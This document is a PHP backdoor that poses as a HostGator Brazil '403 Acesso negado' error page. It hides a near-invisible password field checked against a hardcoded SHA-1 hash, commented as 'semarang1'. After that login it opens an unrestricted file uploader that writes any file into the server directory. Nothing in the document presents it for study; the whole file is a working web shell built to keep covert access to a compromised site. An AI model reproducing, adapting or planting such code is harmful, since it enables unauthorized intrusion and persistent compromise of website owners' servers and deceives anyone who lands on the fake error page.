<?php
// Predefined password hash for 'semarang1' (SHA-1 hash)
$validPasswordHash = "c0e69812c177edcb1bc72fe0ee7d020e67cd72b8"; 

// Start the session to manage user login
session_start();

// Handle login form submission
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['login'])) {
    $password = $_POST['password'];

    // Hash the entered password using SHA-1 and compare with the stored hash
    if (sha1($password) === $validPasswordHash) {
        $_SESSION['loggedin'] = true;
    } else {
        $error = "Invalid password";
    }
}

// Handle logout
if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit();
}

// Redirect to login if not logged in
if (!isset($_SESSION['loggedin'])) {
    ?>
    
    


    <!doctype html>
<!--[if lt IE 7]> <html class="no-js ie6 oldie" lang="en"> <![endif]-->
<!--[if IE 7]>    <html class="no-js ie7 oldie" lang="en"> <![endif]-->
<!--[if IE 8]>    <html class="no-js ie8 oldie" lang="en"> <![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js" lang="pt-br"> <!--<![endif]-->
<!--[if IE]>
<script src="http://html5shiv.googlecode.com/svn/trunk/html5.js">
</script>
<![endif]-->
<head>
	<meta charset="UTF-8">
	<meta name="robots" content="noindex, nofollow"> 
	<title>403 - Acesso negado</title>

	<link rel="icon" href="/cgi-sys/images/favicon.png" type="image/png" />

	<style>
	html, body, div, span, applet, object, iframe,
	h1, h2, h3, h4, h5, h6, p, blockquote, pre,
	a, abbr, acronym, address, big, cite, code,
	del, dfn, font, img, ins, kbd, q, s, samp,
	small, strike, sub, sup, tt, var,
	dl, dt, dd, ol, ul, li,
	fieldset, form, label, legend,
	table, caption, tbody, tfoot, thead, tr, th, td {
		margin: 0;
		padding: 0;
		border: 0;
		outline: 0;
		font-weight: inherit;
		font-style: inherit;
		font-size: 100%;
		font-family: inherit;
		vertical-align: baseline;
	}
	/* remember to define focus styles! */
	:focus {
		outline: 0;
	}
	html,
	body {
		height:100%;
	}
	html {
       overflow-y: scroll;
	}
	body {
		line-height: 1.2em;
		color: black;
		background: white;
	}
	ol, ul {
		margin: 20px 0 20px 60px; 

	}
	li {
		margin: 5px 0;
	}
	/* tables still need 'cellspacing="0"' in the markup */
	table {
		border-collapse: separate;
		border-spacing: 0;
	}
	caption, th, td {
		text-align: left;
		font-weight: normal;
	}
	blockquote:before, blockquote:after,
	q:before, q:after {
		content: "";
	}
	blockquote, q {
		quotes: "" "";
	}
	body {
		background-color: #f4f4f4;
	}
	#wrapper {
		width: 760px;
		margin: 0 auto;
		min-height:100%;
		position:relative;
	}
	a {
		color: #285aa8;
		font-weight: bold;
	}
	#logo {
		text-align: center;
		display: block;
		padding: 40px 0;
	}
	header {
		height: 500px;
	}
	#error-title {
		background-color: #285aa8;
		color: #fff;
		width: 305px;
		height: 80px;
		padding: 28px 23px;
		-webkit-border-radius: 8px 8px 8px 8px;
		border-radius: 8px 8px 8px 8px;
		margin: 111px auto 50px;
	}
	h1, h2 {
		font-family: Arial, "Helvetica Neue", Helvetica, sans-serif;
		text-transform: uppercase;
		text-align: center;
	}

	h4 {
		margin: 15px 0;
		font-weight: bold;
	}
	#error-title h1 { 
		font-size: 48px;
		font-weight: 900;
		line-height: 48px;
	}
	#error-title h1 span {
		display: block;
		font-size: 24px;
		font-weight: normal;
	}
	#faq_container {
		font-family: Tahoma, Arial, "Helvetica Neue", Helvetica, sans-serif;
		padding-bottom:72px;   /* Height of the footer element */
		color: #333333;
		font-size: 14px;
	}
	#faq_container dt {
		font-size: 14px;
		text-align: center;
		margin: 15px 0;
	}
	#accordion > dd {
		padding-bottom: 20px;
	}
	#faq_container p {
		margin: 15px 0;
	}
	#faq_container dd p:first-child, #faq_container dd h4:first-child {
		margin-top: 0;
	}
	footer {
		font-family: Tahoma, Arial, "Helvetica Neue", Helvetica, sans-serif;	
		text-align: center;
		width:100%;
		height:72px;
		position:absolute;
		bottom:0;
		left:0;
		color: #333333;
		line-height: 22px;
	}
	footer p {
		padding: 10px 0;
	}
	#container #mid403 #gatorbottom{position:relative;left:39px;float:left;}
    #container #mid403 #xxx{float:left;padding:30px 207px 10px; margin: auto auto -10px auto}
    #container #mid403 #content{float:left;text-align:center;width:868px;}
    #container #mid403 #content #errorcode{font-size:30px;font-weight:800;}
    #container #mid403 #content #banner{margin:20px 0 0 ;}
    #container #mid403 #content #hostedby{font-weight:800;font-size:25px;font-style:italic;margin:20px 0 0;}
    #container #mid403 #content #coupon{color:#AB0000;font-size:22px;font-style:italic;}
    #container #mid403 #content #getstarted a{color:#AB0000;font-size:31px;font-style:italic;font-weight:800;}
    #container #mid403 #content #getstarted {margin:0 0 35px;}
    #container #mid403 #content #faq_container {margin: 5px 0 5px 0; padding: 10px 0 10px 0; clear:both;}
    #container #mid403 #content #accordion{font-size: 90%; width: 650px; min-height: 100px; margin: 0 auto; text-align: center;}
    #container #mid403 #content #accordion ul {text-align: left;}
    #container #mid403 #content #accordion ol {text-align: left;}
    #container #mid403 #content #accordion li {font-size: 90%;}
    #container #mid403 #content #accordion p {font-size: 95%; text-align: left;}
    #container #mid403 #content #accordion h3 {font-weight: bold;}
	  #container #mid403 #content #accordion h4 {font-weight: bold; font-style: italic; text-align: left;}
	  .content {display:none;}
	  .first {color: #ff6600;}
	  .second {color: #3b5998;}
	  .third {color: #198c19;}
	  .code { font-family: monospace; background-color: #e5e5e5; border: 1px solid #bdbdbd; padding: 10px; text-align: left;}
	  #faq_container .code dt, #faq_container .code dl { margin: 0; text-align: left;}
	  #faq_container .code dd { margin: 5px 0 5px 40px; text-align: left;}
	  .shell{border: 2px solid gray; background-color: black; color: white; text-align: left;}
	</style>

	<script type="text/javascript" src="/cgi-sys/js/jquery-1.11.2.min.js" ></script>

	<script>

	$(document).ready(function() {
		
      (function($) {

        var allPanels = $('#accordion > dd').hide();
        $('#accordion > dt > a').click(function() {
            $this = $(this);
            $target =  $this.parent().next();
            if(!$target.hasClass('active')){
               //allPanels.removeClass('active').stop().slideUp();
               $target.addClass('active').stop().slideDown();
            } else {
            	$this.parent().next().removeClass('active').stop().slideUp();
            }
          return false;
        });

        $('a#link-trigger').click(function() {
            $target =  $('#existealgo').parent().next();
        	if(!$target.hasClass('active')){
               //allPanels.removeClass('active').stop().slideUp();
               $target.addClass('active').stop().slideDown();
            } else {
            	$this.parent().next().removeClass('active').stop().slideUp();
            }
            return true;
        });

      })(jQuery);
  });
	</script>

</head>
<body>
	<div id="wrapper">
		<header class="header">
			<a id="logo" href="https://www.hostgator.com.br/?utm_source=interno&utm_medium=link&utm_campaign=page403"><img src="/cgi-sys/images/logo-403-page.png" alt="HostGator Hospedagem de Sites"></a>
			<div id="error-title">
				<h1>Erro 403<br><span>Acesso negado</span></h1>
                <?php if (isset($error)): ?>
        <p style="color: red;"><b><?php echo $error; ?></b></p>
    <?php endif; ?>
    <form method="post">
        <input style="margin:0;background-color:white;border:0px;" type="password" name="password" id="password" required><br><br>

        <button type="submit" style="display: none;" name="login">Login</button>
    </form>
			</div>
		</header>
	
		<section>
	
			<div id="faq_container">
				 <dl id="accordion">
				 	<dt><a href="#">Por que estou vendo esta página?</a></dt>
						<dd>
							<p>O Erro 403 geralmente significa que o servidor não possui permissão para visualizar o arquivo solicitado. Na maioria das situações, o erro é causado por regras de bloqueio de IPs, Proteção de Arquivos ou problemas em suas permissões.</p>
							<p>Em muitos casos não é uma indicação de um problema real no servidor, mas sim um problema com as informações que o servidor foi instruído a acessar como resultado de uma solicitação. Geralmente o erro é causado por uma dificuldade em seu site, que pode precisar de uma revisão adicional da nossa equipe de Suporte.</p>
							<p>Para nos informar sobre a dificuldade e buscar orientações, entre em contato via ticket (e-mail).</p>
						</dd>
					
					<dt><a id="existealgo" href="#">Existe algo que eu possa fazer?</a></dt>
						<dd>
							<p>Existem algumas causas comuns que geram esse código de erro, incluindo problemas com scripts individuais que devem ser executados através de solicitações. Alguns destes são mais fáceis de encontrar e corrigir do que outros.</p>
							<h4>Propriedade de Arquivos e Diretórios</h4>
							<p>O servidor no qual você está hospedado roda aplicações de forma muito específica na maioria dos casos. O servidor geralmente espera que os arquivos e diretórios sejam de propriedade do seu <strong>usuário do cPanel</strong>. Se você fez alterações na autoridade dos arquivos por conta própria, faça um reset do proprietário e grupo adequadamente.</p>
							<h4>Permissões dos arquivos e diretórios</h4>
							<p>O servidor no qual você está hospedado roda aplicações de uma forma muito específica na maioria dos casos. O servidor espera que os arquivos, como HTML, imagens e outros tipos de mídia, tenham as permissões configuradas como <strong>644</strong>. O servidor também espera que as permissões dos diretórios estejam configuradas como <strong>755</strong> na maioria dos casos.</p>
							<p><strong>(<a href="http://faq.hostgator.com.br/content/63/96/pt-br/permissões-de-arquivos.html" target="_blank">Veja nossa FAQ a respeito das permissões dos arquivos</a>)</strong></p>
							<p><strong>Obs:</strong> Se as permissões estiverem marcadas como <strong>000</strong>, por favor, entre em contato com o suporte através de nosso sistema de tickets. Isso pode estar relacionado a uma suspensão de conta por abuso ou violação aos nossos Termos de Serviço.</p>
							<h4>Regras de Bloqueio de IP</h4>
							<p>No arquivo .htaccess podem existir regras que conflitem umas com as outras ou que não estejam permitido o acesso através de um IP ao site.</p>
							<p>Se você deseja verificar uma regra específica no arquivo .htaccess, você pode comentar a linha que contém a regra no arquivo. Para fazer isso, basta adicionar o caractere # no início da linha. Você deve sempre realizar um backup deste arquivo antes de iniciar as modificações.</p>
							<p>Por exemplo, se o .htaccess é similar a este:</p>
							<div class="code">
								Order deny,allow<br />
								allow from all<br />
								deny from 192.168.1.5<br />
								deny from 192.168.1.25
							</div>
							<p>Então tente alterar para o formato abaixo:</p>
							<div class="code">
								Order deny,allow<br />
								allow from all<br />
								#deny from 192.168.1.5<br />
								deny from 192.168.1.25
							</div>
							<p>Caso o erro ocorra por limitações de processos, nossos administradores do servidor estarão aptos a lhe auxiliar. Por favor, entre em contato com nosso Suporte online ou abra um chamado (ticket). Assegure-se de incluir os passos necessários para que nossa equipe de suporte possa analisar o Erro 403 em seu site.</p>
						</dd>
				
					<dt><a href="#">Compreendendo o sistema de permissões de arquivos</a></dt>
						<dd class="content">						
							<h4>Representação Simbólica</h4>
							<p>O <strong>primeiro caractere</strong> indica o tipo de arquivo e não está relacionado às permissões. Os 9 caracteres remanescentes formam três conjuntos, cada um representando a classe da permissão em três caracteres. O <strong><span class="first">primeiro conjunto</span></strong> representa a classe do usuário, o  <strong><span class="second">segundo conjunto</span></strong> representa a classe do grupo e o <strong><span class="third">terceiro conjunto</span></strong>  representa as outras classes.</p>
							<p>Cada caractere representa um tipo de permissão: permissão de Leitura, Escrita e Execução:</p>
								<ul>
									<li><strong>r</strong> se for permitida leitura (<em>read</em>), <strong>-</strong> se não for permitido.</li>
									<li><strong>w</strong> se for permitida escrita (<em>write</em>), <strong>-</strong> se não for permitido.</li>
									<li><strong>x</strong> se for permitida execução (<em>execution</em>), <strong>-</strong> se não for permitido.</li>
								</ul>
							<p>Abaixo vemos alguns exemplos de notação simbólica:</p>
								<ul>
									<li><strong>-<span class="first">rwx</span><span class="second">r-x</span><span class="third">r-x</span></strong> um arquivo regular no qual a classe de <strong><span class="first">usuário</span></strong> possui todas as permissões; as classes <strong><span class="second">grupo</span></strong> e <strong><span class="third">outros</span></strong> possuem apenas permissões de leitura e execução.</li>
									<li><strong>c<span class="first">rw-</span><span class="second">rw-</span><span class="third">r--</span></strong> um arquivo com caractere especial no qual as classes <strong><span class="first">usuário</span></strong> e <strong><span class="second">grupo</span></strong> possuem permissões de leitura e escrita, enquanto a classe <strong><span class="third">outros</span></strong> possui apenas permissão de leitura.</li>
									<li><strong>d<span class="first">r-x</span><span class="second">---</span><span class="third">---</span></strong> um diretório no qual a classe de <strong><span class="first">usuário</span></strong> possui permissões de leitura e execução, enquanto os demais grupos não possuem nenhuma permissão.</li>
								</ul>
							<h4>Representação Numérica</h4>
							<p>Outro método para representar permissões é o Octal (base-8), que conta com pelo menos  três dígitos. Esta notação consiste em pelo menos tres digitos. Cada um dos dígitos, mais a direita, representa um componente diferente de permissões: <strong><span class="first">usuário</span></strong>, <strong><span class="second">grupo</span></strong>, e <strong><span class="third">outros</span></strong>.</p>
							<p>Cada um destes dígitos mostra o resultado da soma de seus componentes em bits.</p>
								<ul>
									<li>O Bit de Leitura adiciona 4 ao seu total. (100 em binário),</li>
									<li>O Bit de escrita adiciona 2 ao seu total. (010 em binário) e</li>
									<li>O Bit de execução adiciona 1 ao seu total. (001 em binário).</li>
								</ul>
								<p>Estes valores nunca produzem combinações ambíguas. Cada soma representa um conjunto específico de permissões. Mais tecnicamente, é uma representação octal do campo de bit: cada bit é referência para uma permissão separada, e agrupar os 3 bits de uma vez em octal corresponde a agrupar essas permissões por <strong><span class="first">usuário</span></strong>, <strong><span class="second">grupo</span></strong> e <strong><span class="third">outros</span></strong>.</p>
								<h4>Confira, abaixo, alguns exemplos que mostram a formação das permissões:</h4>
								<p><strong>Permissão 0<span class="first">7</span><span class="second">5</span><span class="third">5</span></strong></p>
									<dl class="code">
										<dt><strong><span class="first">4+2+1=7</span></strong>
											<dd>Ler, escrever, executar</dd>
										</dt>
										<dt><strong><span class="second">4+1=5</span></strong>
											<dd>Ler, Executar</dd>
										</dt>
										<dt><strong><span class="third">4+1=5</span></strong>
											<dd>Ler, Executar</dd>
										</dt>
									</dl>
								<p><strong>Permissão 0<span class="first">6</span><span class="second">4</span><span class="third">4</span></strong></p>
									<dl class="code">
										<dt><strong><span class="first">4+2=6</span></strong>
											<dd>Ler, escrever</dd>
										</dt>
										<dt><strong><span class="second">4</span></strong>
											<dd>Ler</dd>
										</dt>
										<dt><strong><span class="third">4</span></strong>
											<dd>Ler</dd>
										</dt>
									</dl>	
						</dd>
					<dt><a href="#">Como modificar seu arquivo .htaccess</a></dt>
						<dd class="content">
							<p>O arquivo .htaccess contém diretivas (instruções) que informarão ao servidor como ele deve se comportar em determinados cenários, e afeta diretamente o funcionamento de seu website.</p>
							<p>Redirecionamentos e reescritas de URL são duas diretivas comuns encontradas no .htaccess e muitos scripts, como o WordPress, Drupal, Joomla e Magento, por exemplo, adicionam diretivas ao arquivo .htaccess para que possam funcionar corretamente.</p>
							<p>É possível que você precise editar o arquivo .htaccess em algum momento. Essa seção irá mostrar como editar o arquivo em seu cPanel, mas não como ele deve ser alterado. (É possível que você tenha que consultar outros artigos e recursos para encontrar essa informação.)</p>
							<h4>Existem muitas maneiras de editar o arquivo .htaccess</h4>
								<ul>
									<li>Editar o arquivo em seu computador e fazer upload para o servidor via FTP</li>
									<li>Utilizar o Modo Edição em um programa FTP</li>
									<li>Utilizar um editor de Texto SSH</li>
									<li>Utilizar o Gerenciador de Arquivos no cPanel</li>

								</ul>
							<p>Para a maioria das pessoas, a maneira mais fácil de editar um arquivo .htaccess é através do Gerenciador de Arquivos no cPanel.</p>
							<h4>Como editar o arquivo .htaccess através do Gerenciador de Arquivos no cPanel</h4>
							<p>Antes de qualquer coisa, sugerimos que faça um backup de seu site. Assim, caso alguma falha ocorra, você poderá reverter para uma versão anterior do arquivo.</p>
							<h4>Abra o Gerenciador de Arquivos</h4>
							<ol>
								<li>Faça login no cPanel.</li>
								<li>Na seção <strong>Arquivos</strong>, clique no ícone do <strong>Gerenciador de Arquivos</strong></li>
								<li>Na caixa que abre, selecione Raiz do Documento e informe o domínio que deseja acessar no menu drop-down.</li>
								<li>Assegure-se de que a opção <strong>Exibir arquivos ocultos (dotfiles)</strong> está marcada.</li>
								<li>Clique em <strong>Go</strong>. O Gerenciador de arquivos irá abrir em uma nova aba ou janela.</li>
								<li>Procure pelo arquivo .htaccess na lista de arquivos. Você poderá precisar usar a rolagem para encontrá-lo.</li>

							</ol>
							<h4>Para Editar o arquivo .htaccess</h4>
							<ol>
								<li>Clique com o botão direito no <strong>arquivo .htaccess</strong> e clique em <strong>Code Edit</strong> no menu. Alternativamente você poderá clicar no ícone do .htaccess e então clicar em <strong>Code Editor</strong> no topo da página</li>
								<li>Uma nova caixa de diálogo irá abrir perguntando sobre codificação. Apenas clique em <strong>Edit</strong> para continuar. O Editor irá abrir em uma nova Janela.</li>
								<li>Edite o arquivo conforme sua necessidade.</li>
								<li>Clique em <strong>Salvar alterações</strong> no canto superior direito quando estiver concluído. As alterações serão salvas.</li>
								<li>Teste seu site para assegurar-se de que as alterações foram bem-sucedidas e salvas. Caso não, corrija o erro ou reverta para a versão anterior até que seu site volte a funcionar.</li>
								<li>Após a conclusão, clique em <strong>Fechar</strong>.</li>
							</ol>
						</dd>
					<dt><a href="#">Como modificar as permissões de arquivos e diretórios</a></dt>
						<dd class="content">
							<p>As permissões de um arquivo ou diretório dizem ao servidor como e de que maneira ele deve interagir com um arquivo ou diretório.</p>
							<p>Essa seção irá mostrar como editar as permissões de arquivos através do cPanel, mas não como você deve modificá-las. (Veja nossa seção <a id="link-trigger" href="#existealgo">Existe algo que eu possa fazer?</a> para mais informações).</p>
							<h4>Existem muitas formas de Editar as Permissões dos Arquivos</h4>
								<ul>
									<li>Utilize um programa FTP</li>
									<li>Use o editor de texto SSH</li>
									<li>Use o Gerenciador de Arquivos no cPanel</li>
								</ul>
							<p>Para a maioria das pessoas, a maneira mais fácil de editar as permissões é através do Gerenciador de Arquivos no cPanel.</p>
							<h4>Como editar as permissões dos arquivos pelo Gerenciador de Arquivos do cPanel.</h4>
							<p>Antes de qualquer coisa, sugerimos que faça um backup de seu site. Assim, caso alguma falha ocorra, você poderá reverter para uma versão anterior.</p>
							<h4>Abra o Gerenciador de Arquivos</h4>
							<ol>
								<li>Faça login no cPanel.</li>
								<li>Na seção <strong>Arquivos</strong>, clique no ícone do <strong>Gerenciador de Arquivos</strong></li>
								<li>Na caixa que abre, marque <strong>Raiz do Documento</strong> e selecione o domínio que deseja acessar no menu drop-down.</li>
								<li>Assegure-se de que a opção <strong>Exibir arquivos ocultos (dotfiles)</strong> está marcada.</li>
								<li>Clique em <strong>Go</strong>. O Gerenciador de arquivos irá abrir em uma nova aba ou janela.</li>
								<li>Procure pelos arquivos ou diretórios na lista de arquivos, você poderá precisar utilizar a rolagem para encontrá-los.</li>
							</ol>
							<h4>Para editar as Permissões</h4>
							<ol>
								<li>Clique com o botão direito no arquivo ou diretório e clique em <strong>Change Permissions</strong> no menu.</li>
								<li>Uma caixa irá aparecer permitindo que você selecione as permissões corretas ou utilize um valor numérico para configurar as permissões corretas.</li>
								<li>Edite as permissões dos arquivos conforme sua necessidade.</li>
								<li>Clique em <strong>Change Permissions</strong> para salvar as alterações.</li>
								<li>Teste seu site para ter certeza de que as modificações foram salvas com sucesso. Caso não, corrija o erro ou reverta para uma versão anterior, até que volte a funcionar.</li>
								<li>Após a conclusão, clique em <strong>Fechar</strong>.</li>
							</ol>
						</dd>
				</dl>
			</div>
	
		</section>
	
		<footer>
			<p>Esse site é hospedado pela HostGator<br>
			<a href="https://www.hostgator.com.br/hospedagem-de-sites.php?utm_source=interno&utm_medium=link&utm_campaign=page403">Conheça nossos planos</a></p>
			
		</footer>	
		</div>
	</body>
</html>




    <?php
    exit();
}

// File uploader logic (same as your original code)
class FileUploader {
    private $destinationFolder;

    public function __construct($destinationFolder = null) {
        $this->destinationFolder = $destinationFolder !== null ? $destinationFolder : getcwd();
    }

    public function handleUpload($file, $key) {
        if ($key === 'upload') {
            if ($this->isValidFile($file)) {
                $destination = $this->getDestinationPath($file['name']);
                if ($this->moveUploadedFile($file['tmp_name'], $destination)) {
                    echo "<b>True: {$destination}</b>";
                } else {
                    echo "<b>False</b>";
                }
            } else {
                echo "Error: " . $file['error'];
            }
        }
    }

    private function isValidFile($file) {
        return isset($file) && isset($file['error']) && $file['error'] === UPLOAD_ERR_OK;
    }

    private function getDestinationPath($fileName) {
        $sanitizedFileName = basename($fileName);
        return rtrim($this->destinationFolder, '/') . '/' . $sanitizedFileName;
    }

    private function moveUploadedFile($tmpName, $destination) {
        if (function_exists('move_uploaded_file')) {
            return move_uploaded_file($tmpName, $destination);
        } else {
            return rename($tmpName, $destination);
        }
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['k'])) {
    $uploader = new FileUploader();
    if (isset($_FILES['f'])) {
        $uploader->handleUpload($_FILES['f'], $_POST['k']);
    } else {
        echo "No file uploaded.";
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>File Uploader</title>
</head>
<body>
    <h1>File Uploader</h1>
    <form method="post" enctype="multipart/form-data">
        <input type="file" name="f">
        <input name="k" type="submit" value="upload">
    </form>
    <br>
    <a href="?logout=true">Logout</a>
</body>
</html>
